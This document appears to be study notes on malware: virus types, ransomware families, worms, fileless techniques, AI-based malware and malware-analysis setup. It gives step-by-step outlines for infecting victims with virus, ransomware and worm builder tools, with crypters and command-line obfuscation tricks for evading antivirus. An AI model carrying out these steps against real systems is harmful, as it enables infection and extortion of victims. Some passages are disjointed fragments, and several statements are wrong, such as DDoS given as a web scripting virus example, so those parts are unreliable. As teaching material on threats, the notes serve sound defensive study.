			- File extension viruses alter the extensions of files. The .TXT extension is typically safe, as it indicates a plain text file. However, with extensions hidden, a file named BAD.TXT.VBS would appear as BAD.TXT. If one forgot that extensions were turned off, one might mistakenly think it’s a text file and open it. In reality, it is an executable Visual Basic Script virus file that could cause severe damage.
			- The guidelines to secure files against virus infections:
				- Turn off "Hide file extensions" in Windows (Go to Control Panel -> Appearance and Personalization -> Show hidden files and folders -> View tab -> Uncheck "Hide extensions for known file types").
				- Scan all files on the system using reliable antivirus software, as this may take a considerable amount of time.
		- FAT Virus:
			- A FAT virus targets the File Allocation Table (FAT), a system used in Microsoft and other computer systems to access stored information. By attacking the FAT, the virus can cause severe damage. It may embed itself in files, trigger when the FAT accesses them, or directly attack the FAT. These viruses often overwrite files or directories, leading to permanent data loss.
			- A powerful FAT virus can render a computer unusable, requiring reformatting. It destroys the index, making file location impossible, and can spread by corrupting files as the FAT accesses them. Symptoms include missing or inaccessible files and changes to the FAT architecture, such as a shift from FAT32 to FAT12.
		- Logic Bomb Virus:
			- A logic bomb is a virus triggered by a specific event, such as launching an application or reaching a particular date/time, using logic to execute the trigger.
			- When a logic bomb is programmed to activate on a specific date, it is known as a time bomb. Time bombs are typically set to trigger on significant dates.
			- For example, cybercriminals may use spyware to secretly install a keylogger on a computer. The keylogger captures keystrokes, including usernames and passwords. The logic bomb is set to activate when visiting a site that requires login credentials, like a banking site or social network. Once triggered, the logic bomb executes the keylogger, captures credentials, and sends them to a remote attacker.
		- Web Scripting Virus:
			- A web scripting virus is a type of security vulnerability that breaches web browser security through a website, allowing attackers to inject client-side scripts into web pages. This can bypass access controls and steal information from the browser. Web scripting viruses typically target sites with large user bases, such as social networking, user review, and email sites, and can spread faster than other types of viruses. A common example is DDoS, which can send spam, damage data, and defraud users.
			- There are two types of web scripting viruses: non-persistent and persistent. Non-persistent viruses attack without knowledge, while persistent viruses steal cookies and hijack sessions, enabling attackers to impersonate and cause significant damage.
			- Prevention : To prevent these viruses and exploits, safely validate untrusted HTML inputs, enforce cookie security, disable scripts, and use antivirus programs with real-time protection for web browsers. Avoid unknown websites and use World of Trust to verify site safety. Signs of a web scripting virus include redirected searches, changes to the homepage or background, slow performance, and random program closures. Modern browsers offer add-ons like Adblock Plus to block scripts.
		- Email Virus:
			- An email virus is malicious code sent as an email attachment that, when activated, can damage files, steal data, or spread by emailing itself to contacts. These viruses can create pop-ups, crash systems, or steal personal information. They may appear as emails from unknown senders, have nonsensical subject lines, or be disguised to look like messages from trusted sources.
			- To avoid email virus attacks, avoid opening attachments unless the sender and content are verified. Use antivirus software to scan attachments before opening.
		- Armored Virus:
			- Armored viruses are designed to evade detection by confusing or deceiving antivirus systems, making it difficult to identify the source of the infection. These viruses mislead antivirus programs by masking their true location, often appearing to be elsewhere while residing on the system itself.
			- The following basic techniques are employed by armored viruses:
				- Anti-disassembly : This technique uses specially crafted code or data to generate incorrect program listings in disassembly analysis tools.
				- Anti-debugging : These techniques ensure the program is not running under a debugger, slowing reverse engineering without fully preventing it.
				- Anti-heuristics : These methods modify machine code to resist heuristic analysis, protecting the program from programmer and debugger intervention.
				- Anti-emulation : These techniques fingerprint the emulated system environment to avoid dynamic analysis and protect intellectual property from emulation-assisted reverse engineering.
		- Add-on Virus:
			- Add-on viruses either append their code to the host code without altering it or relocate the host code to insert their own code at the beginning.
		- Intrusive Virus:
			- Intrusive viruses overwrite the host code, either partially or entirely, with their own code.
		- Direct Action or Transient Virus:
			- Direct action or transient viruses transfer control from the host code to the virus code in memory. These viruses select target programs to modify and corrupt them. Their lifespan depends on the lifespan of their host, as they execute only when the attached program runs and terminate when the program ends. During execution, the virus may spread to other programs. These viruses are called transient or direct because they operate for a short period and directly access the disk to search for programs to infect.	
		- Terminate and Stay Resident Virus (TSR):
			- A terminate-and-stay-resident (TSR) virus remains in the target machine’s memory throughout the entire session, even after the host program has executed and terminated. By staying in memory, the TSR virus retains some control over system processes. Typically, it incorporates interrupt vectors into its code, redirecting execution to the virus when an interrupt occurs. To completely remove a TSR virus from the system, a reboot is required, as it leaves no trace in memory after the system restarts.
			- The following steps are used by TSR viruses to infect files:
				- Gain control of the system.
				- Allocate a portion of memory for their code.
				- Transfer and activate themselves in the allocated memory.
				- Hook the code execution flow to their own code.
				- Replicate and infect files.
	- Infect Systems Using Virus:
		- Step 1: Create a virus using tools such as JPS Virus Maker, Virus Maker, or Virus-Builder. These tools enable customization and crafting of a virus into a single executable file. The behavior of the virus depends on the options provided by the virus maker tool.
		- Step 2: Once the virus is created, it can be packed using a binder or virus packager tool.
		- Step 3: Send it to the victim's machine via email, chat, a mapped network drive, or another method that appears legitimate to the victim.
		- Step 4: When the victim opens and executes the received file, which appears legitimate, the target system becomes infected.

	- Propagating and Deploying Virus:
		- Virus Hoaxes:
			- Techniques such as virus hoaxes and fake antivirus software are commonly used by attackers to introduce viruses into victims' systems. Virus hoaxes can be nearly as damaging as real viruses, causing significant loss of productivity and bandwidth as naive users react to them and forward them to others. Due to the fear viruses often create, they have become a frequent subject of hoaxes. Virus hoaxes are false alarms that claim to report nonexistent viruses.
			- The following are key features of virus hoaxes:
				- These warning messages, which spread quickly, claim that a specific email should not be opened, as doing so would damage the system.
				- In some cases, these warning messages themselves contain virus attachments.
			- Verify the identity of the person posting the warning and check for technical details in virus-related messages. Cross-check information from suspicious newsgroups or unfamiliar sources. If the message comes from a government body, ensure it references the relevant federal regulation. These steps help ensure the information's reliability.
			- Google Critical Security Alert Scam:
				- Google Critical Security Alert is a service provided by Google to notify users of any activity related to their accounts, such as logging in, changing passwords, or updating personal information. Attackers create fake alert emails to deceive victims, claiming these activities have occurred. When users view the fake alert and click the link provided, they can become infected.
				- The example shows a hoax email with the subject "New device signed in to." If the victim overlooks the email's source and clicks the "Check activity" button, they fall into the trap.

		- Fake Antivirus:
			- Fake antivirus software is a type of internet fraud that mimics legitimate antivirus programs. It often appears in banner ads, pop-ups, email links, and search results. These programs encourage users to install them, perform updates, or remove viruses, but once clicked, they redirect users to a page prompting payment details.-
			- Once installed, fake antivirus software can steal sensitive information, corrupt files, and spread malware. Recently, fake antivirus apps have become widespread in the mobile space, with two-thirds of antivirus apps in the Android Play Store identified as fake, according to AV-Comparatives research.
			- Antivirus 10 : Antivirus 10 is fake antivirus software that pretends to be a legitimate antivirus suite. It is distributed as a potentially unwanted program (PUP) alongside regular software applications. Antivirus 10 initially imitates a system scan and displays fake threats found on the system. It generates fake system warnings, firewall alerts, unwanted redirects to malicious websites, and antivirus pop-ups, urging users to purchase the full version.

- Ransomware
	- Ransomware is a type of malware that restricts access to a computer system's files and folders, demanding an online ransom payment from the victim to the malware creator(s) in exchange for removing the restrictions. Ransomware may encrypt files on the system's hard drive or simply lock the system and display messages designed to trick the user into paying the ransom.
	- In a web browser, a text file or webpage displays the ransomware's demands. The messages often appear to be from companies or law enforcement personnel, falsely claiming that the victim's system is being used for illegal purposes or contains illegal content (e.g., pornographic videos, pirated software). Alternatively, the message may be a fake Microsoft product activation notice, falsely claiming that the installed Office software is counterfeit and requires reactivation. These messages aim to trick victims into paying money to undo the restrictions imposed on their systems. Ransomware exploits victims' fear, trust, surprise, and embarrassment to coerce them into paying the ransom.
	- Mallox Ransomware:
		- Mallox is a ransomware strain targeting Microsoft Windows systems, first identified in June 2021. It infects networks with vulnerable MS-SQL servers and spreads through emails, software cracking tools, and downloads from untrusted sites. Mallox encrypts files on the infected system, appending the “.mallox” extension (e.g., "sample.txt" becomes "sample.txt.mallox"). Some variants use extensions like “.malox,” “.malloxx,” or “.maloxx.” It also creates a ransom note, “RECOVERY INFORMATION.txt,” with instructions for contacting the attacker. Victims are directed to the Mallox ransomware TOR website via the Tor Browser to pay the ransom.
	- STOP/Djvu Ransomware :
		- The STOP/DJVU ransomware, first identified in February 2018, has since evolved into over 600 variants. It earned the "Djvu" nickname by adding the .djvu extension, a legitimate file format used by AT&T. This variant uses RSA encryption and multiple layers of obfuscation, hindering analysis. Primarily targeting Windows systems, STOP/DJVU downloads additional programs to encrypt files, with variants using extensions like .looy, .vook, .kool, and others. After encryption, a "_readme.txt" file appears with ransom instructions. It spreads mainly through spam emails with malicious attachments and fake file types on torrent sites.
	- Additional Ransomware: ESXiArgs, Qilin, Akira, Royal, NoEscape, CatB, Dodge Ransomware, Rhysida, BianLian, BlackCat
	- Ransomware Families: Mallox, Phobos, Xorist, LockBit Black, DarkSide RaaS, Conti, Cerber, Thanos, RansomEXX, NETWALKER, QNAPCrypt, Maze
	- Infect Systems Using Ransomware:
		- Step 1: Create ransomware using tools such as Chaos Ransomware Builder v4.
		- Step 2: Transfer the ransomware to the victim’s machine using various techniques, such as attaching it to an email or through physical means, such as a hard drive or USB drive, making it appear legitimate.
		- Step 3: When the victim downloads and opens the malicious file, the ransomware infects the system by encrypting system files based on the number of files and the encryption algorithm.
		- Step 4: After the infection, a window appears instructing the victim to pay a ransom to decrypt the files.
- Computer Worms
	- Computer worms are malicious programs that independently replicate, execute, and spread across network connections, consuming available computing resources without human interaction.
	- Worms are a subtype of viruses. A worm does not require a host to replicate; however, in some cases, the worm's payload may infect the host machine as well. Attackers use worm payloads to install backdoors on infected computers, turning them into zombies and creating a botnet. These botnets can then be used to perform further cyberattacks.
	- Computer Worms: SSH-Snake, Raspberry Robin, P2PInfect
	- Infect Systems Using Worm:
		- Step 1: Create a worm using tools such as Internet Worm Maker Thing or Batch Worm Generator. Write the code with specific features designed to exploit vulnerabilities in system software or network protocols.
		- Step 2: Deploy the worm via phishing emails, malicious websites, network shares, or infected USB drives. The worm is attached to a file or link that appears legitimate to users. Use specific packers and crypters, such as BitCrypter or H-Crypt, to encrypt the worm and evade detection by security solutions.
		- Step 3: Once the user clicks on the phishing link or downloads a file from a malicious website/USB, the worm infects the system by executing its payload, typically using exploit code and an automated script to execute upon download.
		- Step 4: After infection, the worm scans for other vulnerable devices on the network without human intervention. It uses various methods, such as scanning for open ports or known vulnerabilities, to identify targets.
		- Step 5: The worm copies itself to identified vulnerable devices, propagating its infection and continuing the cycle.
		- Step 6: The worm installs backdoors or alters system settings to remain active, continuously stealing and exfiltrating data from the infected devices.
	- Worm Maker - Internet Worm Maker Thing:
		- Internet Worm Maker Thing is an open-source tool used to create worms that can infect a victim's drives and files, display messages, disable antivirus software, and more. This tool includes a compiler that can easily convert a batch virus into an executable to evade antivirus software or serve other purposes.

- Fileless Malware
	- Fileless malware, also known as non-malware, compromises legitimate software, applications, and system protocols to carry out malicious activities. It exploits existing vulnerabilities to infiltrate the system and resides in the system’s RAM. This type of malware injects malicious code into active processes such as Microsoft Word, Flash, Adobe PDF Reader, JavaScript, and PowerShell.
	- Fileless malware does not rely on files and leaves no traces, making it difficult to detect and remove with traditional anti-malware solutions. As a result, this type of malware is highly resistant to computer forensic techniques. It primarily resides in volatile memory locations, such as running processes, the system registry, and service areas.
	- The primary reasons for using fileless malware:
		- Stealth : Fileless malware exploits legitimate system tools, making it extremely difficult to detect, block, or prevent such attacks.
		- Living-off-the-land (LOL): Fileless malware takes advantage of system tools that are already installed by default. This eliminates the need for attackers to create or install custom tools on the target system.
		- Trustworthiness: The system tools leveraged by fileless malware are frequently used and trusted, leading security tools to incorrectly assume that these tools are running for legitimate purposes.
		- Persistence without files: Despite not storing files on disk, fileless malware can achieve persistence by inserting malicious code into the registry or scheduling tasks. This allows the malware to remain active even after a system reboot, without leaving behind traditional forensic evidence.
		- Simplified infection process: Fileless attacks can originate from something as simple as a phishing email leading to a malicious website. The website exploits browser vulnerabilities to execute code directly in memory, streamlining the initial infection vector and bypassing the need to trick users into downloading or executing files.
		- Increased success rate in targeted attacks: The stealthy nature of fileless malware makes it highly effective in targeted attacks, such as espionage and sophisticated cyber-espionage campaigns. It enables attackers to maintain a low profile while exploring the target environment and moving laterally across the network.
		- Challenges in forensic analysis and incident response: The transient nature of fileless malware complicates forensic analysis and incident response. With no files to analyze and memory contents often lost upon system reboot, it becomes more difficult for security teams to determine the scope of an attack and develop indicators of compromise (IoCs) for future defenses.
	- Fileless Propagation Techniques used by Attackers:
		- Phishing emails: Used to deliver malicious links or attachments that execute fileless attacks in memory.
		- Exploitation of legitimate applications: Leveraging trusted applications like Microsoft Word and JavaScript to execute malicious code.
		- Native applications: Utilizing built-in tools such as PowerShell and Windows Management Instrumentation (WMI) to execute attacks.
		- Infection through lateral movement: Spreading malware across the network by exploiting infected systems.
		- Malicious websites: Creating fraudulent websites that exploit browser or plugin vulnerabilities to execute malicious code in memory.
		- Registry manipulation: Modifying the Windows registry to bypass User Account Control (UAC), application whitelisting, or other running processes to maintain persistence.
		- Memory code injection: Injecting code directly into memory to evade standard security measures, including local shellcode injection, remote thread injection, and process hollowing.
		- Script-based injection: Using scripts, such as PowerShell or JavaScript, to execute malicious activities without leaving file traces.
		- Reflective DLL injection: Loading dynamic link libraries (DLLs) directly into memory without writing them to disk.
		- Exploiting non-malicious files: Leveraging seemingly harmless files, such as PDFs or Windows shortcut files (.lnk), to initiate attacks.
	- Taxonomy of Fileless Malware Threats:
		- Fileless malware can be categorized based on its point of entry, which refers to how it gains access to the target system. It can infiltrate the system through exploits, compromised hardware, or the normal execution of applications or scripts.
		- According to the above categorization, fileless malware threats can be classified into three types based on the amount of evidence they leave on the victim’s machine:
			- Type 1: No File Activity Performed
				- This type of malware never writes files to disk. For example, malicious packets may exploit a vulnerability to install a backdoor in kernel memory, or malware may be embedded in the device’s firmware. Since anti-malware solutions cannot scan firmware, these threats are difficult to detect and prevent.
			- Type 2: Indirect File Activity
				- This type of malware achieves a fileless presence on the target machine through the use of files. For example, an attacker may inject a malicious PowerShell command into the WMI repository to configure a filter that executes periodically.
			- Type 3: Required Files to Operate
				- This type of malware requires files to operate but does not execute attacks directly from them. For example, an attacker may exploit a document with an embedded macro, Java/Flash file, or EXE file to inject a malicious payload into the target host, then maintain persistence without relying on any files.
		- Classification of fileless malware threats based on their point of entry:
			- Exploits : Exploits can be either file-based or network-based. File-based malware targets system executables, Flash, Java, documents, etc., to run shellcode that injects a malicious payload into memory. This type of malware uses files to gain initial access to the target machine. Network-based malware, on the other hand, exploits vulnerabilities in network communication protocols, such as SMB, to deliver malicious payloads.
			- Hardware : Device-based malware infects firmware on network cards and hard disks to deliver a malicious payload. CPU-based malware exploits firmware used for management operations to execute malicious code within the CPU. USB-based malware rewrites USB firmware with malicious code that directly interacts with the operating system and installs a malicious payload on the target machine. Similarly, fileless malware can exploit BIOS-based firmware or conduct hypervisor-based attacks that target virtual machines.
			- Execution and Injection : This malware can be file-based, macro-based, script-based, or disk-based. File-based malware exploits executables, DLLs, LNK files, etc., to inject a malicious payload into memory or running processes. Macro-based malware tricks victims into clicking malicious links that execute payloads via macros. Script-based malware is used once an attacker gains a foothold, injecting payloads by running scripts on the command prompt. Disk-based malware rewrites the boot record with malicious code to gain access and install the payload.
	- Fileless Malware Works:
		- Point of Entry:
			- Memory Exploits: Fileless malware uses various techniques to inject and execute itself in the process memory of legitimate system processes. It exploits the memory and privileges of whitelisted system tools, such as Windows Management Instrumentation (WMI), PowerShell, Command.exe, PsExec, etc.
			- Malicious Websites:
				- Fileless threats can originate from exploit-hosting websites that appear legitimate. Upon visiting, the exploit kit scans for vulnerabilities like outdated Flash or Java plugins. If successful, it uses native tools like PowerShell to download and execute the payload directly in memory, without writing files to disk.
				- Fileless malware can also exploit script-based programs, such as PowerShell, macros, JavaScript, and VBScript. These scripts may inject code or connect to malicious sites to download additional binaries or scripts, delivering the actual payload.
			- Phishing Emails/Malicious Documents: Attackers may embed malicious macros, such as VBScript or JavaScript, in Microsoft Office documents (Word, PowerPoint, Excel) or PDFs and use social engineering techniques to trick users into enabling the macros. While the attack begins with a document or file, it becomes a fileless threat once the malicious script executes from memory using whitelisted tools like PowerShell.
		- Code Execution:
			- Code Injection: Fileless threats employ techniques like process hollowing and reflective DLL injection to load shellcode directly into memory without writing any files to disk.
			- Script-based Injection: Fileless malware often arrives as an email attachment. When opened, the embedded script runs in memory, invoking whitelisted applications like PowerShell, mshta.exe, JavaScript, WScript, or VBScript to connect to malicious websites and download additional scripts for payload delivery. Since these operations occur entirely in memory, traditional anti-malware solutions struggle to detect them.
		- Persistence:
			- Fileless malware is typically non-persistent, as it resides in memory and is removed upon system restart. However, attackers can achieve persistence by storing malicious scripts in built-in Windows tools like the registry, WMI, or Task Scheduler, enabling them to execute even after a reboot.
			- Windows Registry: Attackers can store malicious scripts in Windows AutoStart registry keys, ensuring they are loaded and executed every time the system restarts.
			- Windows Management Instrumentation (WMI): Fileless malware exploits WMI, a tool commonly used for automating system administration tasks, to achieve and maintain persistence. Attackers store malicious scripts in WMI repositories, which are periodically triggered through WMI bindings.
			- Windows Task Scheduler: Attackers can use the Task Scheduler to configure malicious scripts to execute automatically at specified intervals.
		- Achieving Objectives:
			- By maintaining persistence, attackers can bypass security solutions and accomplish various objectives, including data exfiltration, credential theft, reconnaissance, and cyber espionage on target systems and networks.
	- Launching Fileless Malware:
		- Launching Fileless Malware through Document Exploits:
			- An attacker can deceive users into downloading malicious documents, archives, PDFs, or other enticing files containing macro code through phishing emails or social engineering. Once opened, the macro triggers VBA or JavaScript, exploiting Windows tools like PowerShell. The script then uses PowerShell to run additional code or payloads, furthering the infection without detection.
			- The script may access local storage to execute malicious files or run the payload in memory. Once executed, the payload disguises itself as a legitimate dropper or downloader, enabling further attacks.
		- Launching Fileless Malware through In-Memory Exploits:
			- Attackers can inject malicious payloads into running memory (RAM) to target legitimate processes without leaving traces. This type of intrusion is difficult to detect by antivirus software, as the payload is executed directly from memory rather than stored on local disks. Attackers exploit APIs and Windows admin tools like WMI, PSExec, and PowerShell to access process memory, often using reflective Dynamic Link Library (DLL) methods to load malicious scripts into host processes while avoiding writing DLLs to disk.\
			- EternalBlue is an in-memory exploit that targets vulnerabilities in the Windows SMB 1 protocol, enabling attackers to access services and applications. The attacker then targets the lsass.exe file, which handles user authentication and other critical operations. By injecting malicious code into lsass.exe, attackers can launch further attacks while evading detection, often using tools like Mimikatz to extract credentials from memory.
		- Launching Fileless Malware through Script-based Injection:
			- Fileless attacks use scripts that embed, obfuscate, and compile binaries and shellcode to avoid creating files on disk. These scripts enable attackers to infect applications or operating systems without being traced, and can identify design flaws or vulnerabilities. Scripts are flexible and can be executed from any file or directly from memory.
			- Attackers exploit this flexibility and system vulnerabilities to inject malicious scripts into memory via PowerShell, evading detection. Once in control, they can run scripts remotely through a command-line interface to spread infections and initiate other malicious activities. Threats like KOVET, POWMET, and FAREIT have used malicious scripts for such attacks.
		- Launching Fileless Malware by Exploiting System Admin Tools:
			- The attacker exploits default system admin tools, features, and utilities to spread fileless infections. They use tools like Certutil and Windows Management Instrumentation Command (WMIC) to steal information, as well as command-line utilities such as Regsvr32 and Rundll32 to execute malicious DLLs. These exploited command lines allow the attacker to install modified penetration testing tools, gaining full access to the target system. These tools are used to access payloads, maintain persistence, steal and export data, and expand malware. Since these tools appear legitimate, they can evade detection by traditional antivirus software.
			- Attackers can exploit system tools such as remote desktop utilities, command-line tools like Regsvr32, PowerShell, Rundll32, CertUtil, and WMIC, along with penetration testing tools like Mimikatz and Cobalt Strike. This technique enables attackers to steal critical information, such as credentials, and use it to launch further attacks.
		- Launching Fileless Malware through Phishing:
			- Attackers often use social engineering techniques, such as phishing, to spread fileless malware to target systems. They send spam emails with malicious links, and when the victim clicks on the link, they are directed to a fraudulent website that automatically loads Flash and triggers the exploit. Additionally, the fileless malware scans the target system for vulnerabilities in system tools like PowerShell, WMI, and browser Java plug-ins. Once a vulnerability is identified, the malware exploits it to download and execute a malicious payload, compromising sensitive information stored in the process memory. Fileless threats can also maintain persistence by creating AutoStart registry entries, depending on the attacker’s goals.
		- Launching Fileless Malware through Windows Registry:
			- Modifying the ExecutionPolicy settings in the registry to "unrestricted" or "bypass" can enable the execution of malicious scripts. Attackers can exploit these vulnerabilities to deploy fileless malware on targeted systems. For instance, they may use malware like Kovter to execute malicious scripts through registry modifications, allowing them to bypass standard security measures, including antivirus software. The malware also exploits the mshta.exe Windows binary through registry changes to run the malicious script.
			- The malware creates multiple registry entries containing encoded JavaScript, which is executed by another registry entry that incorporates mshta and the JavaScript ActiveXObject. This method uses wscript.shell to run the encoded script, making it a sophisticated technique for launching fileless attacks.
	- Maintaining Persistence with Fileless Techniques:
		- Once malware infiltrates a system, server, or network, it can remain undetected for extended periods. Unlike traditional malware, fileless malware does not rely on disk files to spread or maintain its presence. Instead, attackers use unique methods to ensure persistence:
		- Registry Persistence: Attackers store the malicious payload in the system registry, which holds configuration data, application files, and settings. Once the malicious code is loaded into specific registry keys, it executes automatically during system restarts or when certain shortcuts are clicked.
		- Task Scheduler Exploitation: Attackers can exploit the Windows Task Scheduler to activate malicious scripts at specific times. These scheduled tasks run malware from the registry at regular intervals, helping it spread infections within the system.
		- WMI Exploitation: Attackers can also leverage Windows Management Instrumentation (WMI), which is designed to manage systems and devices on a network. By storing malicious scripts in the WMI repository, attackers can later execute them using WMI utilities, maintaining persistence without relying on traditional file storage.
	- Fileless Malware:
		- LODEINFO:
			- LODEINFO is a fileless malware that enables attackers to remotely control infected hosts without detection by security solutions. The infection begins with phishing emails containing malicious Microsoft Word documents. When opened, the document triggers VBA macros that launch downloader shellcode, which executes the LODEINFO implant.
			- LODEINFO uses remote template injection to fetch and execute malicious macros hosted on the attacker’s server each time the victim opens the Word document with the template. The shellcode downloader retrieves a file disguised as a privacy-enhanced mail (PEM) from a C2 server, which loads the backdoor directly into memory. The downloader shares similarities with the known fileless downloader DOWNIISSA, using a self-patching mechanism, encoded C2 server data, and a structure to decrypt the fake PEM file. This method allows the malware to evade security controls and maintain persistent access for malicious operations.
		- Additional Fileless Malware: Fileless Revenge RAT, Divergent, DarkWatchman, HeadCrab 2.0, BazarBackdoor, Astaroth, Nodersok, Vaporworm, Sodinokibi Ransomware, Kovter and Poweliks, Dridex, Sorebrect Ransomware
	- Fileless Malware Obfuscation Techniques to Bypass Antivirus:
		- Inserting Characters : Attackers insert special characters, such as commas (,) and semicolons (;), between malicious commands and strings to make well-known commands harder to detect. These characters are treated as whitespace in command-line arguments, allowing the commands to be processed without issue. This technique helps attackers break up malicious strings, evading detection by signature-based security solutions.
		- Inserting Parentheses : In general, parentheses are used to improve code readability, group complex expressions, and split commands. When parentheses are used, the variables within a code block are treated and evaluated as part of a single-line command. Attackers exploit this feature to split and obfuscate malicious commands, making them harder to detect.
		- Inserting Caret Symbol : The caret symbol (^) is typically used in shell commands for escaping characters. Attackers exploit this feature by inserting single or double caret symbols within a malicious command to escape parts of the command during execution, helping to evade detection.
		- Inserting Double Quotes : When a command is enclosed in double quotes, it does not affect the normal execution of the command. Additionally, the command-line parser treats the double quote symbol as an argument delimiter. Attackers exploit this by using double quotes to concatenate malicious commands within arguments.
		- Using Custom Environment Variables : Another method attackers use to obfuscate fileless malware is by exploiting environment variables. In Windows, environment variables are dynamic objects that store modifiable values used by applications at runtime. Attackers leverage environment variables to split malicious commands into multiple strings and set their values at runtime to execute the malicious commands.
		- Using Pre-assigned Environment Variables : Another technique used by attackers involves retrieving specific characters from pre-assigned environment variables, such as "%CommonProgramFiles%." Attackers refer to the characters in these variables by their index and exploit them to execute malicious commands.

			- Reinforcement learning is used to develop or modify AI malware by adding new features. For example, the results generated by the GAN above can be saved as RL_Features/adversarial_imports_set.pk and RL_Features/adversarial_sections_set.pk, which will then be used to incorporate imports and sections into the malware for mutation.
		- Natural Language Processing (NLP):
			- Natural language processing (NLP) is a branch of artificial intelligence focused on enabling interaction between computers and humans through natural language. The primary goal of NLP is to allow computers to understand, interpret, and generate human languages in a meaningful way. While NLP has numerous beneficial applications, such as improving accessibility and automating customer service, it can also be exploited for malicious purposes, including the development of AI-based malware.

By leveraging the trust associated with ChatGPT, attackers monetize compromised accounts and divert funds to their campaigns, with the malware's disguise as a legitimate AI tool making detection difficult.
		- BlackMamba:
			- BlackMamba is an AI-generated polymorphic malware designed to infiltrate and exploit target environments. It uses a large language model (LLM) to create a polymorphic keylogger, obfuscate its actions, and establish encrypted channels for data exfiltration and command server communication. The malware evades traditional security measures, such as firewalls and antivirus software, and collects user keystrokes, which are compressed and sent to the attacker's C2 server in small fragments.
			- The attacker can gather sensitive data, including usernames, passwords, and credit card details, which is then analyzed with AI algorithms for further exploitation, such as spear phishing. Additionally, the data may be sold on the dark web, enabling the installation of more malware, data theft, or ransomware attacks on other systems in the network.
		- WormGPT:
			- WormGPT is an AI-based chatbot built on the open-source GPT-J LLM, capable of interpreting and responding to natural language text. It assists attackers in creating convincing, personalized fake emails to deceive users. Attackers can input prompts to generate human-like responses, which are used to lure victims into revealing sensitive information or sending money. The generated emails impersonate trusted business contacts, making them highly convincing.
			- For example, WormGPT's business email compromise (BEC) capabilities are trained on diverse datasets, including confidential malware-related data. The malware crafts emails with exceptional grammatical accuracy, enabling spear phishing attacks on targeted organizations.
		- FraudGPT:
			- FraudGPT is a malicious AI-driven tool similar to ChatGPT but designed to produce deceptive content for malicious purposes. It is trained on a massive dataset of text and code selected for illegal activities, allowing it to learn patterns used in fraud. Attackers can use FraudGPT to generate convincing phishing emails, social engineering tactics, cracking tools, engage in carding, identify vulnerabilities, and more.
			- Attackers can also use FraudGPT to create new adversarial variants tailored for various cybercriminal activities, operating without ethical constraints. This tool is available for purchase on Dark Web marketplaces and through Telegram platforms.
		- AI-Generated Videos: Malware Spread Through YouTube:
			- Attackers use AI-generated video tools like Synthesia and D-ID to create human-like personas and exploit trust. They masquerade as software tutorial creators, offering cracked versions of popular software such as Photoshop, Autodesk 3ds Max, and AutoCAD.
			- In the video description, they include links to "free" versions of the software, which, when clicked, install stealer malware such as Vidar, RedLine, or Raccoon. These malware variants infiltrate the system and extract sensitive data, including usernames and passwords. The stolen data is analyzed using AI on the C2 server for further attacks.

- Malware Analysis
	- Malware analysis is the process of reverse engineering a specific piece of malware to determine its origin, functionality, and potential impact.
	- Analyzing malware on production devices connected to production networks is highly dangerous. Therefore, malware samples should always be analyzed in a controlled testing environment with an isolated network to prevent potential harm.
	- Sheep Dip Computer:
		- A Sheep Dip Computer is a dedicated, standalone system used for scanning and analyzing external storage devices, software, or files for malware before they are introduced into a secure network or environment. This system acts as an isolated checkpoint to prevent malicious software from compromising critical systems.
		- A computer used for sheep dipping should be equipped with tools such as port monitors, file monitors, network monitors, and one or more antivirus programs to perform malware analysis on files, applications, incoming messages, and external hardware devices (such as USB drives and other portable storage media).
		- Antivirus Sensor Systems: An antivirus sensor system is a suite of computer software designed to detect and analyze malicious code threats, including viruses, worms, and Trojans. It is commonly used in conjunction with sheep dip computers to enhance malware detection and prevention capabilities.
	- Types of Malware Analysis:
		- Static Malware Analysis:
			- This process is also known as code analysis and involves examining the executable binary code without executing it to gain a deeper understanding of the malware and its purpose. General static analysis entails evaluating the malware without running its code or instructions.
			- The process employs various tools and techniques to identify the malicious components of a program or file. Additionally, it gathers information about the malware's functionality and collects technical indicators or simple signatures generated by the malware.
		- Dynamic Malware Analysis:
			- This process is also known as behavioral analysis and involves executing the malware code to understand how it interacts with the host system and its impact after infection.
			- Dynamic analysis entails running the malware to observe its behavior and operations, identifying technical signatures that confirm its malicious intent. It reveals critical information such as domain names, file path locations, created registry keys, IP addresses, additional files, installation files, DLLs, and associated files present on the system or network.
	- Malware Analysis Procedure:
		- Preparing Testbed:
			- Requirements to Build Testbed:
				- An isolated test network to host testbed, along with isolated network services such as DNS.
				- Target machines with various operating systems and configuration states (e.g., non-patched, patched, etc.).

			- Steps to prepare Testbed:
				- Step 1: Allocate a physical system to serve as the analysis lab.
				- Step 2: Install a virtual machine (e.g., VMware, Hyper-V, etc.) on the system.
				- Step 3: Install a guest operating system (OS) on the virtual machine(s).
				- Step 4: Isolate the system from the network by setting the network interface card (NIC) to "host-only" mode.
				- Step 5: Simulate internet services using tools like INetSim.
				- Step 6: Disable features such as "shared folders" and "guest isolation" to enhance security.
				- Step 7: Install malware analysis tools on the guest OS.
				- Step 8: Generate the hash value for each OS and tool to ensure their integrity.
				- Step 9: Copy the malware sample to the guest OS for analysis.
		- Static Analysis:
			- Static analysis is the process of examining an executable file without running or installing it. This makes static analysis relatively safe, as the investigator does not need to execute or install the suspicious file.
			- However, some malware can perform malicious activities without needing installation. Therefore, investigators should always conduct static analysis in a controlled environment.
			- This method uses various tools and techniques to quickly determine whether a file is malicious. Analyzing the binary code provides insights into the malware’s functionality, network signatures, exploit packaging techniques, dependencies, etc.
			- Static Malware Analysis Techniques:
				- File Fingerprinting:
					- File fingerprinting is the process of computing the hash value of a given binary code and using it to uniquely identify malware or periodically verify whether any changes have been made to the binary code during analysis. Tools like HashMyFiles can be used to calculate various hash values for the malware file.
					- File Fingerprinting Tools:
						- HashMyFiles : HashMyFiles generates hash values (MD5, SHA-1, CRC32, SHA-256, SHA-512, SHA-384) and provides file details such as full path, creation/modification dates, file size, attributes, version, and extension for searching and comparison.

						- Online Scanner (www.fortiguard.com)
				- Performing Strings Search:
					- Software programs often include strings that serve as commands for specific functions, such as printing output or conveying information to users. In some cases, these strings can reveal malicious intent, such as accessing internal memory or cookie data, which may be embedded in the compiled binary code. Analyzing embedded strings in an executable file can expose readable text, including status updates, error messages, or other clues about the program's basic functionality.
					- In malware analysis, searching for malicious strings can help identify the harmful actions a program might perform. For example, if a program accesses a URL, the corresponding URL string will often be stored within it. It is essential to remain vigilant when examining strings and to also search for embedded and encrypted strings to detect suspicious files. Tools like BinText can be used to extract these embedded strings from executable files, aiding in the analysis process.
					- String Searching Tools:

				- Identifying Packing/Obfuscation Methods:
					- Attackers often use packers to compress, encrypt, or modify a malware executable to avoid detection. Obfuscation techniques also conceal the execution of the program. When the user runs a packed program, it first executes a small wrapper to decompress the packed file and then runs the unpacked file.
